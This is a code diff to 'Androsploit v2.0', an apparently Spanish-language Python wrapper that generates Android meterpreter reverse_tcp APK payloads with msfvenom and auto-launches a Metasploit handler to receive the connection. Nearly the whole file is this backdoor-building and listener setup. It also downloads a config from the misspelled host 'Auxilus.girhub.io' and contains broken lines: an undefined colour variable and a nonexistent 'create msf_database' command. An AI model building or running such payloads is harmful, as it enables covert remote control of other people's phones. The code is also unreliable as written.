@@ -1,26 +1,32 @@
 import os.path
 import time
+import sys
+from colorama import *
 
+init()
+rj = Fore.RED
+vr = Fore.GREEN
+ci = Fore.CYAN
+az = Fore.BLUE
+am = Fore.YELLOW
+r = Style.RESET_ALL
 
-class colors:
-	am = "\033[1;33m"
-	rj = "\033[91m"
-	ci = "\033[1;36m"
-	vr = "\033[32m"
-	vrf = "\033[42m"
-	f = "\033[0m"
-
+sKali = os.path.exists("/usr/")
+sTermux = os.path.exists("/data/data/com.termux/")
 kali = os.path.exists("/usr/share/metasploit-framework")
 termux = os.path.exists("/data/data/com.termux/files/usr/opt/metasploit-framework")
 
 def ini():
-	if kali == True:
+	if sKali == True:
 		kali_linux()
-	elif termux == True:
-		very()
+	elif sTermux == True:
+		termuxver()
+	else:
+		banner()
+		print (rj + '\nEste script no puede ser ejecutado en tu sistema!' + r)
 
 def banner():
-	print (colors.vr + '''				
+	print (vr + '''				
 			███████▀▀▀░░░░░░░▀▀▀███████
 			████▀░░░░░░░░░░░░░░░░░▀████
 			███│░░░░░░░░░░░░░░░░░░░│███
@@ -38,136 +44,175 @@ def banner():
 			█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
 			███████▄░░░░░░░░░░░▄███████
 			██████████▄▄▄▄▄▄▄██████████
-										''' + colors.f)
-	print ("                      -------------------------------")
-	print ("                           Informática y Hacking   ")
-	print ("                      -------------------------------")
-	print ("                      https://informaticayhacking.cf")
-	print ("                      -------------------------------\n\n")
+                 Androsploit v2.0		''' + r)
+	print (rj + "                      -------------------------------" + r)
+	print (az + "                           Informática y Hacking   " + r)
+	print (rj + "                      -------------------------------" + r)
+	print (az + "                      https://informaticayhacking.com" + r)
+	print (rj + "                      -------------------------------" + r)
+	print (az + "                         t.me/Informática_y_Hacking  " + r)
+	print (rj + "                      -------------------------------\n\n" + r)
 
-
-def kali_linux():
-	if kali == False:
-		print (colors.am + "Error, no se ha encontrado Metasploit Framework en su sistema " + colors.f + colors.rj + "[X]" + colors.f)
+def proceso():
+	directorio = os.path.exists("Androsploit_Payloads")
+	if directorio == False:
+		os.system('mkdir Androsploit_Payloads')
 	else:
-		os.system("clear")
-		print (colors.vrf + "Verificando Metasploit Framework en su sistema...\n" + colors.f)
-		time.sleep(2)
-		print (colors.ci + "Metasploit Framework " + colors.f + "[" + colors.vr + "OK"  + colors.f + "]\n")
-		time.sleep(2)
-		print (colors.am + "Ejecutando Androsploit en Kali Linux..." + colors.f)
-		time.sleep(2)
-		banner()
-		nom = input (colors.ci + "Ingrese un nombre para su Payload" + colors.f + colors.rj + " >>  " + colors.f)
-		print ("")
-		host = input (colors.ci + "Ingrese su Host o IP " + colors.f + colors.rj + " >>  " + colors.f)
-		print ("")
-		port = input (colors.ci + "Ingrese el Puerto " + colors.f + colors.rj + " >>  " + colors.f)
-		print ("\n")
-		print (colors.am + "Generando " + nom + ".apk, por favor espere..." + colors.f)
-		time.sleep(2)
-		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + host + " LPORT=" + port + " R > /root/Escritorio/" + nom + ".apk")
-		print ("\n\n")
-		pport = input (colors.ci + "En caso de usar Ngrok, Serveo o Portmap ingrese su puerto local de lo contrario use el mismo que se ingresó anteriormente " + colors.f + colors.rj + ">>  " + colors.f)
-		os.system("clear")
-		print ("")
-		print (colors.vr + "El Payload " + nom + ".apk se ha generado con éxito y se ha guardado en /Escritorio/" + colors.f)
-		time.sleep(3)
-		os.system("touch autos.rc")
-		os.system("echo 'use exploit/multi/handler' >> autos.rc")
-		os.system("echo 'set payload android/meterpreter/reverse_tcp' >> autos.rc")
-		os.system("echo 'set lhost '" + host + ">> autos.rc")
-		os.system("echo 'set lport '" + pport + ">> autos.rc")
-		os.system("echo 'exploit' >> autos.rc")
-		os.system("curl -LO https://Auxilus.girhub.io/database.yml")
-		os.system("mkdir -p $PREFIX/var/lib/postgresql")
-		os.system("initdb $PREFIX/var/lib/postgresql")
-		os.system("pg_ctl -D $PREFIX/var/lib/postgresql start")
-		os.system("createuser msf")
-		os.system("create msf_database")
-		os.system("msfdb reinit")
-		os.system("clear")
-		print (colors.vr + "Configurando msfconsole espere..." + colors.f)
-		os.system("msfconsole -r autos.rc")
-
-def good():
-
-	os.system("clear")
-	print (colors.vrf + "Verificando Metasploit Framework en su sistema...\n" + colors.f)
+		pass
+	os.system('clear')
+	print (vr + "Verificando Metasploit Framework en su sistema...\n" + r)
 	time.sleep(2)
-	print ("Metasploit Framework " + colors.vr + "[OK]\n" + colors.f)
-	time.sleep(1)
-	print (colors.am + "Ejecutando Androsploit en Termux..." + colors.f)
-	time.sleep(1)
+	print (ci + "Metasploit Framework " + r + "[" + vr + "OK"  + r + "]\n")
+	time.sleep(2)
 	banner()
-	nom = input (colors.ci + "Ingrese un nombre para su Payload" + colors.f + colors.rj + " >>  " + colors.f)
+	nom = input (ci + "Ingrese un nombre para su Payload" + r + rj + " >>  " + r)
 	print ("")
-	host = input (colors.ci + "Ingrese su Host o IP " + colors.f + colors.rj + " >>  " + colors.f)
-	print ("")
-	port = input (colors.ci + "Ingrese el Puerto " + colors.f + colors.rj + " >>  " + colors.f)
-	print ("\n\n")
-	print (colors.am + "Generando " + nom + ".apk, por favor espere...\n\n" + colors.f)
+	ques = input(ci + "Red local?" + r + " [s/n] " + rj + ">>  " + r)
+	quest = ques.lower()
+	if quest == 's':
+		print ("")
+		host = input (ci + "Ingrese su Host o IP " + r + rj + " >>  " + r)
+		print ("")
+		port = input (ci + "Ingrese el Puerto " + r + rj + " >>  " + r)
+		pport = port
+	elif quest == 'n':
+		print ("")
+		host = input (ci + "Ingrese su Host o IP " + r + rj + " >>  " + r)
+		print ("")
+		pport = input (ci + "Ingrese el Puerto global" + r + rj + " >>  " + r)
+		print ("")
+		port = input (ci + "Ingrese el Puerto local" + r + rj + " >>  " + r)
+	print ("\n")
+	print (am + "Generando " + nom + ".apk, por favor espere..." + r)
 	time.sleep(2)
-	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + host + " LPORT=" + port + " R > /storage/emulated/0/" + nom + ".apk")
-	pport = input (colors.ci + "En caso de usar Ngrok, Serveo o Portmap, ingrese su puerto local de lo contrario use el mismo que se ingresó anteriormente " + colors.f + colors.rj + ">>  " + colors.f)
+	os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} R > Androsploit_Payloads/{}.apk'.format(host,pport,nom))
 	os.system("clear")
+	banner()
 	print ("")
-	print (colors.vr + "El Payload " + nom + ".apk se ha generado con éxito y se ha guardado en su memoria interna." + colors.f)
-	time.sleep(3)
-	os.system("touch autos.rc")
-	os.system("echo 'use exploit/multi/handler' >> autos.rc")
-	os.system("echo 'set payload android/meterpreter/reverse_tcp' >> autos.rc")
-	os.system("echo 'set lhost '" + host + ">> autos.rc")
-	os.system("echo 'set lport '" + pport + ">> autos.rc")
-	os.system("echo 'exploit' >> autos.rc")
+	print (vr + "El Payload " + nom + ".apk se ha generado con éxito y se ha guardado en Androsploit_Payloads" + r)
+	auto = open('autos.rc', 'w')
+	auto.write('use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost {}\nset lport {}\nexploit'.format(host, port))
+	auto.close()
 	os.system("curl -LO https://Auxilus.girhub.io/database.yml")
 	os.system("mkdir -p $PREFIX/var/lib/postgresql")
 	os.system("initdb $PREFIX/var/lib/postgresql")
 	os.system("pg_ctl -D $PREFIX/var/lib/postgresql start")
 	os.system("createuser msf")
 	os.system("create msf_database")
+	os.system("msfdb reinit")
 	os.system("clear")
-	print (colors.vr + "Configurando msfconsole espere..." + colors.f)
+	banner()
+	print (vr + "Configurando msfconsole espere..." + r)
 	os.system("msfconsole -r autos.rc")
 
+def proceso_termux():
+	ruta = os.path.exists('/storage/emulated/0/Androsploit_Payloads')
+	if ruta == False:
+		os.system('mkdir /storage/emulated/0/Androsploit_Payloads')
+	else:
+		pass
+	os.system('clear')
+	print (vr + "Verificando Metasploit Framework en su sistema...\n" + r)
+	time.sleep(2)
+	print (ci + "Metasploit Framework " + r + "[" + vr + "OK"  + r + "]\n")
+	time.sleep(2)
+	banner()
+	nom = input (ci + "Ingrese un nombre para su Payload" + r + rj + " >>  " + r)
+	print ("")
+	ques = input(ci + "Red local?" + r + " [s/n] " + rj + ">>  " + r)
+	quest = ques.lower()
+	if quest == 's':
+		print ("")
+		host = input (ci + "Ingrese su Host o IP " + r + rj + " >>  " + r)
+		print ("")
+		port = input (ci + "Ingrese el Puerto " + r + rj + " >>  " + r)
+		pport = port
+	elif quest == 'n':
+		print ("")
+		host = input (ci + "Ingrese su Host o IP " + r + rj + " >>  " + r)
+		print ("")
+		pport = input (ci + "Ingrese el Puerto global" + r + rj + " >>  " + r)
+		print ("")
+		port = input (ci + "Ingrese el Puerto local" + r + rj + " >>  " + r)
+	print ("\n")
+	print (am + "Generando " + nom + ".apk, por favor espere..." + r)
+	time.sleep(2)
+	os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} R > /storage/emulated/0/Androsploit_Payloads/{}.apk'.format(host,pport,nom))
+	os.system("clear")
+	banner()
+	print ("")
+	print (vr + "El Payload " + nom + ".apk se ha generado con éxito y se ha guardado en /storage/emulated/0/Androsploit_Payloads" + r)
+	auto = open('autos.rc', 'w')
+	auto.write('use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost {}\nset lport {}\nexploit -j'.format(host, port))
+	auto.close()
+	os.system("curl -LO https://Auxilus.girhub.io/database.yml")
+	os.system("mkdir -p $PREFIX/var/lib/postgresql")
+	os.system("initdb $PREFIX/var/lib/postgresql")
+	os.system("pg_ctl -D $PREFIX/var/lib/postgresql start")
+	os.system("createuser msf")
+	os.system("create msf_database")
+	os.system("msfdb reinit")
+	os.system("clear")
+	banner()
+	print (vr + "Configurando msfconsole espere..." + r)
+	os.system("msfconsole -r autos.rc")
 
+def kali_linux():
+	if kali == False:
+		print (am + "Error, no se ha encontrado Metasploit Framework en su sistema " + r + rj + "[X]" + r)
+	else:
+		proceso()
 
-def very():
-
+def termuxver():
 	if termux == False:
 		os.system("clear")
 		banner()
-
-		print (colors.am + "Error, no se ha encontrado Metasploit Framework en su sistema " + colors.f + colors.rj + "[X]" + colors.f)
+		print (am + "Error, no se ha encontrado Metasploit Framework en su sistema " + r + rj + "[X]" + r)
 		print ("")
-		elec = input(colors.ci + "Desea Instalar Metasploit Framework?" + colors.f + colors.am + " [s/n] " + colors.f + colors.rj + ">>  " + colors.f)
+		elec = input(ci + "Desea Instalar Metasploit Framework?" + r + am + " [s/n] " + r + rj + ">>  " + r)
 		print ("")
 		if elec == "s":
 			print ("")
-			print (colors.am + "Instalando Metasploit Framework, esto puede tomar varios minutos.." + colors.f)
-			os.system("pkg install unstable-repo")
-			os.system("pkg install metasploit")
-			os.system("clear")
-			print ("")
-			print (colors.vrf + "Verificando la instalación de Metasploit Framework en su sistema..." + colors.f)
+			ver = input('Su versión de android es mayor a 5x ? [s/n]: ')
+			version = ver.lower()
+			if version == 's':
+				print (am + "Instalando Metasploit Framework, esto puede tomar varios minutos.." + r)
+				os.system("pkg install unstable-repo")
+				os.system("pkg install metasploit")
+				os.system("clear")
+				print ("")
+				print (vrf + "Verificando la instalación de Metasploit Framework en su sistema..." + r)
+			elif version == 'n':
+				print (am + "Instalando Metasploit Framework, esto puede tomar varios minutos.." + r)
+				os.system('curl -LO https://github.com/termux/termux-packages/files/3995119/metasploit_5.0.65-1_all.deb.gz')
+				os.system('gunzip metasploit_5.0.65-1_all.deb.gz')
+				os.system('dpkg -i metasploit_5.0.65-1_all.deb')
+				os.system('apt -f install -y')
+			else:
+				print ('')
+				print(rj + 'Responda s o n' + r)
 			if termux == False:
 				banner()
 				print ("")
-				print (colors.rj + "Hubo un error durante la instalación, intente ejecutar" + colors.f + colors.am + " 'pkg upgrade -y'" + colors.f)
+				print (rj + "Hubo un error durante la instalación, intente ejecutar" + r + am + " 'pkg upgrade -y'" + r)
 				
 			else:
-				good()
+				proceso_termux()
+		
 		elif elec == "n":
 			banner()
 			print ("")
-			print (colors.rj + "Se necesita Metasploit Framework para funcionar." + colors.f)
+			print (rj + "Se necesita Metasploit Framework para funcionar." + r)
+			sys.exit()
 			
 		elif elec != "s" or "n":
 			banner()
 			print ("")
-			print (colors.am + "¡Debe ingresar una opción válida.!"+ colors.f)
+			print (am + "¡Debe ingresar una opción válida.!"+ r)
 			time.sleep(2)
-			very()
+			ini()
 	else:
-		good()
+		proceso_termux()
+		
+
 ini()
